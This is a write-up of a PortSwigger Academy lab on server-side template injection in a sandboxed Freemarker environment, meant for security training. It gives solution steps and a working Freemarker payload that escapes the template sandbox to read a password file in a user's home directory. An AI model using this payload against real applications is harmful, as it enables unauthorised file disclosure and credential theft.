# Lab: Server-side template injection in a sandboxed environment

**Official lab:** [Lab: Server-side template injection in a sandboxed environment](https://portswigger.net/web-security/server-side-template-injection/exploiting/lab-server-side-template-injection-in-a-sandboxed-environment)

**Lab idea:** The Freemarker-based challenge focuses on a poorly implemented sandbox and access to a file in the lab user's home directory. It practices evaluating the limits of template sandboxing and the potential for server-side file disclosure.

## Vulnerability in brief
Server-side template injection (SSTI) is a vulnerability in which untrusted input is interpreted as template-language syntax and evaluated by a server-side template engine. Template engines normally combine fixed templates with changing data to render pages. The vulnerability arises when applications construct template source by concatenating user input into it instead of supplying that input strictly as data. This may happen accidentally through unsafe template design or intentionally when an application permits users to submit or modify templates.

## Solution idea
1. Log in and edit one of the product description templates.
2. Load the JavaDoc for the Object class to find methods that should be available on all objects.
3. Explore the documentation to find a sequence of method invocations that grant access to a class with a static method that lets you read a file, such as…
4. Enter this payload in one of the templates and save.
5. Convert the returned bytes to ASCII.
6. Click the "Submit solution" button and submit this string to solve the lab.

## Payloads / key values
- `product`
- `Object`
- `${object.getClass()}`
- `${product.getClass().getProtectionDomain().getCodeSource().getLocation().toURI().resolve('/home/carlos/my_password.txt').toURL().openStream().readAllBytes()?join(" ")}`

## Official source
- [PortSwigger Academy: Lab: Server-side template injection in a sandboxed environment](https://portswigger.net/web-security/server-side-template-injection/exploiting/lab-server-side-template-injection-in-a-sandboxed-environment)
